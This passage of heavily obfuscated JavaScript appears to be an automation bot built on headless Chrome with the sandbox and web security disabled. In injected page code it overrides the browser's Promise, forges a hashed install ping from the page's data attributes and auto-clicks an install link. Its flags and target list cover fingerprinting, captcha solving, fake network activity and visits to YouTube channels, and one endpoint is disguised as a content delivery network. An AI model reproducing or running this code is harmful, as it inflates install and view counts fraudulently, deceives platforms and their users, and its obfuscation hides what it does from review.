& L) << 0x557 * -0x3 + 0x5 * 0x3e2 + -0x1 * 0x35b | 0x26 * -0x1d + 0x207f + -0x146 * 0x13 & J['charCodeAt'](++M)), P[N >> 0x375 * -0x1 + 0x67 * -0x31 + 0x56 * 0x45] |= (-0x2676 + 0x854 * -0x1 + 0x2fba | L >> 0x1 * 0xf37 + 0x1794 + -0x26b9) << y[-0x1 * -0x1837 + -0x14b + -0x16e9 & N++], P[N >> 0x3 * 0x5f7 + -0x1d6b + 0xb88] |= (-0x18 * -0x14b + -0x137 * 0x3 + -0x1 * 0x1ae3 | L >> -0x517 * -0x2 + 0x1120 + -0xda1 * 0x2 & -0x37b + 0xe3f + -0xa85) << y[-0x176b + -0x1272 + -0x28 * -0x10c & N++], P[N >> -0x5a4 + 0x3a2 + 0x204] |= (0x4 * 0x33b + 0x17e5 + -0x2451 | L >> 0x8f6 + 0x20e9 + 0x3 * -0xdf3 & 0x1 * 0x7 + 0x164f * 0x1 + -0x1617) << y[0x9d * 0x26 + -0x1646 + -0x9 * 0x1d & N++], P[N >> 0x233a + 0x1fcc + 0x2182 * -0x2] |= (-0x169e + 0x24de + 0x4 * -0x370 | -0x1 * 0xcd1 + 0x6 * -0x544 + 0x2ca8 & L) << y[0x212d + -0x7a * -0x19 + -0x2d14 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x544 * 0x5 + 0x2f * -0x61 + 0x2c63 ? (this['block'] = P[0x2a9 + -0x101 * -0x12 + 0x1e1 * -0xb], this['start'] = N - (0x7 * -0x6d + -0x1 * -0x16b + -0x8 * -0x3a), this['hash'](), this['hashed'] = 0x1b03 + -0x15 * -0x1bb + -0x3f59) : this['start'] = N;
                }
                return this['bytes'] > -0x3 * -0x61af0b3d + 0x8 * 0x10e7bc34 + -0x1 * 0xac4b0358 && (this['hBytes'] += this['bytes'] / (0x188994e * 0x114 + 0x11e3e99cc + -0x1c583e1e4) << 0x787 * -0x4 + -0x1e2f + 0x3c4b, this['bytes'] = this['bytes'] % (0x8a6a3 * 0x1d84 + -0x592ee11c + 0x59d87e10)), this;
              }
            }
            ['finalize']() {
              const U = b;
              if (!this['finalized']) {
                this['finalized'] = 0x25e + -0x7cd * 0x5 + 0x24a4;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x17e8 * 0x1 + 0xc6 * -0x1f + 0x13 * 0x286] = this['block'], J[K >> -0x1a26 + -0x216d + 0x3b95] |= x[-0x21ce + -0x64 * 0x5b + 0x3 * 0x171f & K], this['block'] = J[-0xbb4 + 0x4 * 0x9c + 0x4 * 0x255], K >= 0x50a + -0x946 + -0x474 * -0x1 && (this[U(0x6, 'H9HG')] || this['hash'](), J[0x7ea * -0x1 + -0x2620 + 0x2e0a] = this['block'], J[-0x1049 + -0x143e * -0x1 + -0x3e5] = J[-0x2 * 0xa51 + 0x9 * 0x124 + 0xa5f] = J[0x2461 * 0x1 + -0xd * -0x31 + -0x26dc * 0x1] = J[0x1c82 + 0x3f1 * 0x4 + -0x2c43] = J[-0xea * 0x1b + -0x17ef * -0x1 + -0xd * -0xf] = J[-0x12d * 0x1d + -0x350 + -0x6 * -0x63d] = J[-0x240a * -0x1 + -0x1 * 0x1ffa + -0x40a] = J[0x163d + -0x114b * 0x1 + -0x1 * 0x4eb] = J[-0x8eb + 0x1 * -0x101 + -0x1a * -0x62] = J[-0xb71 + -0x8 * 0x31 + 0xd02] = J[0x1abc + 0x1ca3 + -0x3755 * 0x1] = J[-0x16d1 + 0x23cd + -0xcf1] = J[0x32 * 0x59 + -0x2 * -0x1313 + -0x377c] = J[0x1578 + -0x47a + -0x10f1] = J[-0x5b0 + -0x19ce + -0x2 * -0xfc6] = J[-0x125e * 0x2 + 0x1a74 + 0xa57] = -0x10 * 0x22a + -0x6 * -0x551 + 0x2ba), J[-0x1 * 0x1add + 0x11b7 + -0x2 * -0x49a] = this['hBytes'] << -0x75 * 0x6 + 0x1 * -0xe59 + 0x111a | this['bytes'] >>> 0x582 * -0x1 + 0x5e * 0x35 + -0xdd7 * 0x1, J[0x16b * 0xd + -0x1 * 0x1dab + -0x31 * -0x3b] = this['bytes'] << 0x270 + -0xe * -0xb4 + -0xc45, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * -0x7d7 + 0xc * -0x251 + 0x23b3; J < 0x2653 + -0x2343 + -0x2c0; ++J)
                K = Q[J - (0x4c6 * 0x3 + -0xd81 * -0x1 + -0x1bd0)] ^ Q[J - (0xd1c + -0x179 + -0xb9b)] ^ Q[J - (0xb53 * 0x1 + -0x3bb + -0x78a)] ^ Q[J - (-0x23fd * -0x1 + -0xe7d + 0xab8 * -0x2)], Q[J] = K << 0x16e7 + -0x7eb + 0x3b * -0x41 | K >>> -0x59 * -0x11 + -0x289 + -0x341;
              for (J = -0xb * 0x285 + 0x54 * 0x29 + 0xe43; J < 0x9 * -0x422 + 0xc01 + 0x1945; J += 0x2032 + -0xc76 + 0x31 * -0x67)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x1b81 + -0x1590 + 0x1 * 0x3116 | L >>> -0x1 * 0xfbf + -0x157 + 0x1131 * 0x1) + (M & N | ~M & O) + P + (0x69fb * -0x161f6 + -0x29bb4129 * -0x4 + 0x461e6727) + Q[J] << -0x22e1 + 0x238a + -0xa9) << 0x8a * -0x8 + -0x1d61 + 0x21b6 * 0x1 | P >>> -0x7e8 + -0xdca + 0x15cd) + (L & (M = M << -0x1 * -0x1f51 + -0x1d47 + 0x1ec * -0x1 | M >>> 0x179d + -0x1ec5 + 0x72a) | ~L & N) + O + (0x4e94 * -0x120f1 + -0x5c61f37e + 0x10f94e66b) + Q[J + (0x1d77 + -0x6 * -0x102 + -0x2382)] << 0x346 * -0x7 + 0x1fa * 0x5 + -0x6 * -0x22c) << -0x24c1 + -0x1 * -0x1a25 + 0xaa1 | O >>> -0x3 * 0xc1 + 0x5e * -0x11 + 0x89c) + (P & (L = L << 0x1043 + 0x1030 + -0x2055 | L >>> 0x48d + -0x2133 * -0x1 + 0x1 * -0x25be) | ~P & M) + N + (-0x2a49d195 * -0x2 + 0x19ee1344 + -0x1d1629f * 0xb) + Q[J + (-0xf47 * -0x1 + -0x25ae + 0x1669)] << 0x780 * -0x1 + -0x3 * 0x1 + 0x783) << -0x2608 + 0x7 * -0x215 + 0x34a0 | N >>> 0xbea * -0x3 + 0xb01 + -0x636 * -0x4) + (O & (P = P << -0x211f + 0x257d + -0x11 * 0x40 | P >>> 0x213e + 0x2 * -0x797 + -0x120e) | ~O & L) + M + (-0x427e3ba5 + -0x3c4fb7a8 + -0xad2 * -0x14157b) + Q[J + (-0xd * -0x2f9 + 0xbba * 0x2 + -0x3e16)] << 0x123 * 0x1e + -0x1 * -0x2680 + -0x489a) << 0x16 * -0x19e + 0x3 * -0x8ab + 0x3d9a | M >>> -0x16ff + 0x12 * -0x19f + 0x3448) + (N & (O = O << 0x5b5 * -0x5 + -0x1c6a + -0x827 * -0x7 | O >>> -0x498 * -0x7 + -0x5c + -0x1fca) | ~N & P) + L + (-0x2947ea3 * -0x7 + -0x1 * -0x9aae7479 + -0x523b7155) + Q[J + (0xceb + -0x12b * -0x7 + 0x8e * -0x26)] << -0x5 * -0x1f7 + 0xc9d + -0x4 * 0x59c, N = N << -0x113c * -0x1 + -0x22d4 + -0x11b6 * -0x1 | N >>> 0x1890 + -0x250e + 0xc80;
              for (; J < -0x35 * 0xab + -0x1 * 0x25d6 + 0x4965; J += 0x1 * 0x10ff + -0x1c47 + 0xb4d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x543 + -0x1986 + 0x1448 | L >>> -0x73 * -0xa + 0x1f7e + -0x343 * 0xb) + (M ^ N ^ O) + P + (-0x4b8ce438 * -0x2 + -0x9504ab1d + 0x6cc4ce4e) + Q[J] << 0x13e4 + -0x70a * 0x4 + 0x844) << -0x2568 + -0x2692 + -0x3 * -0x1955 | P >>> -0x41a + 0x1 * 0x991 + -0x1c * 0x31) + (L ^ (M = M << 0x47 * -0x11 + 0x1304 + 0x1 * -0xe2f | M >>> -0xa0f + -0x21b2 + 0x11 * 0x293) ^ N) + O + (-0x80e7410e + -0x5d4acde2 * 0x2 + -0x1aa56c873 * -0x1) + Q[J + (0x1108 + -0x26a6 + -0x9 * -0x267)] << 0x15cb + 0x1 * -0x187f + 0x15a * 0x2) << -0x1f * 0x1f + -0x2 * 0xee9 + -0xac * -0x32 | O >>> 0x2167 + 0x1b7 * -0xd + 0xb01 * -0x1) + (P ^ (L = L << 0x1c7e + -0x6 * -0x375 + 0x2 * -0x188f | L >>> -0x173d * -0x1 + -0x6 * -0x284 + -0x2653) ^ M) + N + (0x949ddb6d + 0x361e9ae3 * 0x3 + -0xc81fc075) + Q[J + (0x13 * 0x3e + -0x194b + 0x14b3)] << 0x8aa * -0x1 + 0xe5 * 0x1 + 0x7c5) << -0x5 * -0x407 + 0xb * 0x12d + -0x210d | N >>> 0x1 * -0xebd + 0x21 * -0x19 + -0x39d * -0x5) + (O ^ (P = P << -0x1af * -0x1 + -0x1590 + 0x13ff | P >>> -0x1 * -0x530 + -0x17b + -0x3b3) ^ L) + M + (-0x4cbc379 + 0x139 * 0x9e1a37 + -0x4da85e25) + Q[J + (-0xb2 * -0x19 + 0xf95 + -0x57e * 0x6)] << 0x23e6 + -0x93f + -0x1 * 0x1aa7) << 0x1 * 0xe3 + 0x8a3 + -0x3 * 0x32b | M >>> -0xc6d + -0x8 * 0x128 + 0x2 * 0xae4) + (N ^ (O = O << 0x72f * 0x3 + 0x17 * 0x1d + 0x11 * -0x16a | O >>> -0x1629 + -0x4a9 * -0x1 + -0x2 * -0x8c1) ^ P) + L + (-0x2f38d836 + 0x10 * 0x349eac9 + -0x2326b26d * -0x3) + Q[J + (0x208b + 0xb * -0x347 + 0x386)] << 0x9 * -0xe5 + -0x5 * 0x193 + 0xfec, N = N << -0xda0 + -0x1c95 + 0x2a53 | N >>> -0x2245 + -0x3 * -0xb65 + 0x6 * 0x4;
              for (; J < 0x1 * -0x209c + -0xbbb * 0x1 + 0x2c93; J += 0x41b + 0x217c * -0x1 + 0x1d66)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1ab3 * 0x1 + 0x17fd + 0x77 * -0x6d | L >>> 0xcbb * -0x1 + 0x10 * -0x213 + 0x2e06) + (M & N | M & O | N & O) + P - (0x1 * 0xbda2e79b + 0x10019 * 0x9189 + -0xde55dad8) + Q[J] << 0x5 * -0x8 + -0xec + 0x114) << -0x116f * 0x1 + -0x418 * 0x7 + 0xd * 0x38c | P >>> 0x1820 + 0x96c + -0x2171) + (L & (M = M << 0x24cb + 0x11ec + 0x611 * -0x9 | M >>> 0xa28 + -0x230 * -0x8 + -0x1 * 0x1ba6) | L & N | M & N) + O - (-0x3d * -0x2943cc4 + -0xca844456 + 0x9e160cc6) + Q[J + (0x1494 + 0x28e + -0xbf * 0x1f)] << 0x10b2 + -0x10f9 + 0x47 * 0x1) << 0x207e + -0xe * -0x56 + -0x133 * 0x1f | O >>> 0x6 * -0x57d + 0x7b7 + -0xe * -0x1cf) + (P & (L = L << -0x92a + 0x237f + -0x3 * 0x8bd | L >>> -0xb99 * 0x1 + 0xd * 0x223 + 0x1e * -0x8a) | P & M | L & M) + N - (-0x997dafd8 + 0x7c53a210 + 0x47072876 * 0x2) + Q[J + (0xad6 + -0x20a5 + -0x5 * -0x45d)] << 0x40c + 0x24d7 + -0xda1 * 0x3) << -0x1 * -0x1129 + 0x13 * -0x1e9 + 0x1327 | N >>> 0x1380 + 0x86d + 0x946 * -0x3) + (O & (P = P << -0x10d0 * 0x2 + -0x47 * -0x24 + 0x17c2 | P >>> 0x1 * 0x2316 + 0x121f * 0x1 + -0x3533) | O & L | P & L) + M - (0x1449887c + -0x795af418 + 0xd5f5aec0) + Q[J + (-0x1425 + 0x1287 + -0x1 * -0x1a1)] << -0x12 * -0x49 + -0x1076 + 0xb54) << 0x2572 * 0x1 + -0x1fe8 + 0x3 * -0x1d7 | M >>> -0xf58 + -0xbb1 + 0x1b24) + (N & (O = O << 0x36f * 0x8 + -0x17c8 * -0x1 + -0x3322 | O >>> 0x66e * -0x2 + 0x1 * -0x13ab + -0x2089 * -0x1) | N & P | O & P) + L - (-0xd758c965 + 0xb8d231d8 + 0xef * 0x999e5f) + Q[J + (-0x43f * -0x9 + 0x211e + -0x4751)] << 0x11ff + -0x1fd3 + 0xdd4, N = N << -0x2f1 + -0xe * 0x1a5 + -0x25f * -0xb | N >>> -0xb1d * -0x2 + -0xc5d + -0x9db;
              for (; J < 0x1568 + -0x26de * 0x1 + 0x38e * 0x5; J += 0x63a + 0x162 * 0x7 + -0xfe3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x168e + 0x3d * 0x2f + 0xb60 | L >>> -0x1fb7 * -0x1 + -0x424 + -0x8 * 0x36f) + (M ^ N ^ O) + P - (0xef7c561 + 0x14b90a15 + -0x2 * -0x8f6375a) + Q[J] << 0x170 * -0x1 + -0x24d7 + -0x2647 * -0x1) << 0x1b62 * -0x1 + 0x3 * 0x9be + -0x1d3 | P >>> 0x1 * 0x5e + -0xe26 + -0xf * -0xed) + (L ^ (M = M << 0xc * 0x209 + -0xbf9 * -0x3 + 0x1b * -0x23b | M >>> 0x239e + -0x7 * 0x35 + -0x6d5 * 0x5) ^ N) + O - (-0x44f959 * -0x72 + -0x69352202 + -0x1 * -0x801b568a) + Q[J + (0x119 * 0x1d + -0x1f5b * -0x1 + 0x3f2f * -0x1)] << 0x2ec + 0x1 * -0xf07 + 0xc1b) << -0x7 * 0x1af + -0x104a + 0x1c18 | O >>> -0x9 * -0xce + 0xaab * -0x1 + 0x388) + (P ^ (L = L << -0x2254 + 0x1 * 0xa7f + 0x17f3 | L >>> 0x235 * -0x1 + -0x1b0a + 0x1d41) ^ M) + N - (0x529ece2 * 0x10 + 0x5cdc8f8e + -0x1e7787e1 * 0x4) + Q[J + (0x4e9 * 0x4 + -0x775 * 0x2 + -0x2 * 0x25c)] << -0xd62 + 0x11fc + -0x49a * 0x1) << -0xc9b + 0x82 * -0x32 + 0x4 * 0x981 | N >>> -0xe32 + -0x2 * -0x317 + 0x81f) + (O ^ (P = P << 0x20a8 + 0x1571 * 0x1 + -0x35fb | P >>> -0x123e + -0x38 * -0x28 + 0x980) ^ L) + M - (0x49372b73 + -0x685648ce + -0x649 * -0xd7b5d) + Q[J + (0xff1 + -0x7e9 + -0x805 * 0x1)] << 0xb57 + 0x890 * 0x4 + -0x2d97) << -0x617 + 0xec * 0x1b + -0x4 * 0x4b2 | M >>> 0x263e + 0xa43 + -0x162 * 0x23) + (N ^ (O = O << 0x1 * -0x21e5 + 0x3 * 0xb2d + 0x7c | O >>> -0x1e7d + 0x8ba + -0x1 * -0x15c5) ^ P) + L - (0x4eb0a452 + 0x22bbde2d + -0x24629 * 0x1a4d) + Q[J + (-0x19a9 + -0x1 * -0x2006 + -0x659 * 0x1)] << -0x1e9b + -0x1 * -0x775 + 0x1726, N = N << 0x19a4 + 0x428 + -0x1dae | N >>> 0x1 * -0x1d29 + 0x2e * 0xca + 0x49 * -0x19;
              this['h0'] = this['h0'] + L << 0x25 * -0x101 + -0x1 * -0x1b + 0x250a, this['h1'] = this['h1'] + M << -0xb6 + 0x12b8 + -0x1202, this['h2'] = this['h2'] + N << 0x1 * -0x1bc5 + 0x1a57 + -0x3d * -0x6, this['h3'] = this['h3'] + O << -0x1698 + -0x1b0f + 0x39 * 0xdf, this['h4'] = this['h4'] + P << 0x1 * 0xac + -0x6 * -0x234 + -0xde4;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1c14 * 0x1 + 0x18fc * -0x1 + -0x2fc & 0xc5 * 0x27 + -0x1 * -0x1892 + -0x3686] + w[J >> 0x235 * -0x2 + -0xc92 + -0x445 * -0x4 & 0x1 * -0x1496 + -0x2f * -0x3b + 0x9d0] + w[J >> 0xf58 + -0x21 * -0x53 + -0x1 * 0x19f7 & 0x1d3a + 0x139d * 0x1 + 0x1c * -0x1be] + w[J >> 0x2 * 0x109c + 0x41 * 0x1f + -0x2907 & 0x127 + -0x4 * -0xad + -0x3cc] + w[J >> -0x3 * 0x23b + 0x29 * -0xcd + 0x2792 & -0xf62 + -0x1 * 0x22f7 + 0x3268] + w[J >> 0x1168 + 0x1eb6 + -0x3016 & 0x26 * -0x45 + -0x14b0 + 0x1 * 0x1efd] + w[J >> -0x2579 + 0x1da7 * 0x1 + 0x7d6 & -0xf06 + -0xc27 + 0x1b3c] + w[0x6c0 * 0x3 + -0x2106 + 0xf * 0xdb & J] + w[K >> -0x1 * -0x1835 + 0xb2c + 0x2345 * -0x1 & 0x1b23 + -0x1 * -0x16e + -0x59 * 0x52] + w[K >> -0xd8e + 0x2450 + -0x16aa & 0x1 * -0x2204 + 0x3 * 0xce9 + -0x4a8] + w[K >> 0x1 * -0x1e41 + -0x10 * 0x255 + 0x43a5 & 0x127b + -0x2e8 + 0x7c2 * -0x2] + w[K >> -0x1 * -0x19ab + -0x1dc7 + 0x216 * 0x2 & 0xf8 + -0x2390 * 0x1 + 0x22a7] + w[K >> 0x157d + 0x5 * 0x4e1 + -0x2dd6 & 0x103c * 0x2 + 0x4 * 0x379 + -0x2e4d] + w[K >> 0xf65 + -0xcf7 * -0x1 + -0x1c54 & 0x1 * 0xbaf + 0x65 * 0x2d + -0x17 * 0x147] + w[K >> 0x38 * 0x24 + 0x83 * -0x2b + 0x47 * 0x33 & -0x6 * -0x199 + -0x1e66 + -0x6f5 * -0x3] + w[-0x5e * 0x30 + 0x2dc * 0x8 + -0x1bb * 0x3 & K] + w[L >> -0x2438 + 0x20fb + 0x359 & 0x717 + 0x2 * 0x454 + -0xfb0] + w[L >> 0x1 * 0x20af + 0xc11 * 0x1 + 0x2 * -0x1654 & 0x1a00 + -0x87 * 0x12 + -0x1073] + w[L >> -0x2249 + 0x2 * -0x185 + 0x2567 & 0xb4f + 0x8 * -0x4d9 + 0x1b88] + w[L >> -0x5 * 0x5e + -0x196c + 0x1b52 & -0x2242 + -0x1b5a + -0x1 * -0x3dab] + w[L >> -0x39a * -0x2 + -0x9 * 0x37c + 0x1834 & 0x37f * -0x5 + -0x29 * 0x29 + 0xb * 0x231] + w[L >> 0x14e1 + 0x3 * -0xa97 + 0x4 * 0x2bb & -0x1f * -0x7f + -0x1bd * -0x13 + 0x1 * -0x3059] + w[L >> 0xef * -0x25 + 0x21b4 + -0x3 * -0x49 & -0xc96 + -0x1830 + -0x1c1 * -0x15] + w[-0x1 * -0x2bf + -0x2 * 0xc15 + -0x2 * -0xabd & L] + w[M >> -0x9 * 0x3cb + 0x13 * 0x61 + 0x1b0c & 0x185 + -0x1 * -0x1b59 + -0x19 * 0x127] + w[M >> -0x1 * 0x1fd6 + -0x14a + -0x1 * -0x2138 & 0x468 + -0x2 * -0x9f1 + -0x183b] + w[M >> 0x49 * 0x18 + -0x12fe + 0xc3a & -0x2335 + 0x19cb + 0x979] + w[M >> -0x76 * 0x21 + 0x522 * 0x1 + -0x512 * -0x2 & 0x75c + -0x234a + 0x5 * 0x599] + w[M >> 0x94a * -0x4 + -0x5 * 0x779 + 0x4a91 & 0x3d * -0x22 + -0x943 * 0x1 + -0x8b6 * -0x2] + w[M >> 0xbb5 + 0x230 + -0xddd & -0x199e + -0x2089 + -0x3a36 * -0x1] + w[M >> -0x2 * -0x4a3 + -0x212d + 0x9d * 0x27 & 0x5b9 + -0x6 * -0x4e9 + -0x8c8 * 0x4] + w[-0x1219 + -0x1 * 0xb3e + -0x8e * -0x35 & M] + w[N >> -0x2642 + -0xf * -0x27c + -0x5e * -0x3 & 0x12f7 + -0x35 * 0x5c + 0x2 * 0x12] + w[N >> 0x36c * -0x1 + -0x506 * -0x6 + -0x18 * 0x11c & -0x20ab + 0x15ca + 0xaf0] + w[N >> -0x14b7 + -0xfa0 + -0x246b * -0x1 & 0x743 + 0x1d32 + -0x2466] + w[N >> -0x1 * 0x148a + -0x1016 + 0x24b0 & -0x35 + -0xa5 * 0x25 + 0x1 * 0x181d] + w[N >> -0xf5f * -0x1 + -0x1e67 + 0xf14 & 0x238 + 0x1 * 0x3c1 + -0x5ea] + w[N >> -0x1e8a + -0x1b3 * -0x1 + 0x1cdf & 0x3c * -0xf + -0xf06 + 0x1 * 0x1299] + w[N >> 0xd8f + 0x2573 + -0x32fe & 0x1 * 0x1233 + -0x1a70 + 0x84c] + w[0x1 * 0x5c7 + -0x3 * 0x1a5 + 0x1 * -0xc9 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x116d + 0x2 * -0xd + -0x191 * 0xb & -0x5 * 0x29e + -0x27d + 0x3 * 0x586,
                J >> 0x238d + 0xebe + -0x7 * 0x72d & -0x33 * -0x6 + 0x1658 + -0x168b * 0x1,
                J >> 0x121a + -0xccd + -0x545 & 0xcaa * 0x2 + 0x1ada * -0x1 + 0x5 * 0x81,
                -0x1a2c + -0x1ab4 + 0x35df * 0x1 & J,
                K >> -0x6b1 * -0x5 + -0x1a6e + -0x1 * 0x6ef & 0x208b + 0x1 * -0x1231 + -0xd5b,
                K >> 0x3ef + -0x1e87 + 0x1aa8 & -0x12c8 + -0x14b1 + 0x143c * 0x2,
                K >> 0x1c61 + 0x1c52 + -0xa3 * 0x59 & 0x1 * 0x91d + -0x152b * 0x1 + -0x1 * -0xd0d,
                -0x166f + -0x2598 + 0x3d06 & K,
                L >> 0x115 * 0x8 + 0x1 * 0x1136 + 0x19c6 * -0x1 & -0x10a5 * 0x2 + -0x23d + 0x2486,
                L >> -0x7 * 0x3a1 + -0x1816 + 0x318d & -0x1 * 0x22ed + -0x16ec + 0x2 * 0x1d6c,
                L >> -0x67d + -0x4b5 + -0x2 * -0x59d & -0x960 + 0x15dc + -0xb7d,
                -0x4f * -0x11 + -0x123b + 0xdfb & L,
                M >> 0x1dd7 + 0x21d3 * -0x1 + -0x6 * -0xae & 0x2 * -0x16b + 0x581 * -0x6 + 0x24db,
                M >> -0x6fd + -0x1 * -0x1b1a + 0x57 * -0x3b & -0x2264 * -0x1 + 0x2a8 + 0x240d * -0x1,
                M >> 0xd79 + -0x27d + -0x2bd * 0x4 & 0xd91 + 0x118d * -0x1 + 0x4fb,
                -0x18c + -0x38c + 0x617 * 0x1 & M,
                N >> -0x1 * 0x1f86 + -0x25fb + 0x4599 & 0x4b6 + -0x322 + -0x95,
                N >> -0x15 * 0x14a + 0x2490 + -0x8e * 0x11 & -0x197e + 0x1 * -0x83b + 0x22b8,
                N >> -0x4 * 0x1f3 + -0xc7f + 0x1453 & -0x40 * 0x43 + 0x219 * 0x8 + 0xf7,
                -0x295 * -0x8 + -0x1 * -0x1bd9 + -0x2f82 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x58e + 0x1181 * -0x1 + 0x1723), (K = new DataView(J))['setUint32'](-0x1bf + -0xa39 * -0x3 + 0x9a4 * -0x3, this['h0']), K['setUint32'](0x1 * 0x1cb5 + 0x2667 + -0x4318, this['h1']), K['setUint32'](0xfff + 0x12c0 + -0x22b7, this['h2']), K['setUint32'](-0x4 * 0x376 + 0x2615 + -0x1831, this['h3']), K['setUint32'](-0x1 * -0x1833 + 0xcaf + -0x24d2, this['h4']), J;
            }
        }
        G['prototype'][V(0x20)] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x16 * -0x191 + 0x35 * -0x4b + -0x12ef];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0xe94 + -0x2 * -0x823 + -0x1b2;
            J[-0xf0 * 0x6 + 0x17e7 * 0x1 + 0x1 * -0x1247]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * -0x1d1b + 0x104 * -0x19 + -0x3b7] = L => {
              const W = d;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1137 + -0x1e7b + 0xd45), O['overrideMi' + 'meType'](W(0x8)), O['onload'] = () => {}, O['send'](), K = -0x536 + -0x56 * 0x34 + -0x1 * -0x16af;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x22f6 + 0x16f * -0xe + 0xa26 * 0x6), Promise['resolve'](-0x11c2 + 0x7cb + 0x9f8);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x6 * 0x361 + 0x1455 + 0x181 * -0x1b; j < 0x83 * 0x47 + -0x5 * -0x26b + -0x306b; j++)
    i();
}
const NETWORK_PATIENCE = -0x32a5 + 0x104b + 0x419a + (0x2c6 + -0x2373 + 0x5 * 0x8e1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x541 + 0x1483 + -0xf3f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      X(0xd, 'Y^Zj') + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      X(0x2, 'fHFg') + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + X(0x18, 'L3D6') + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    Y(0x1f) + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x177 * -0x3 + -0x52 * 0x8 + -0x1d5; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
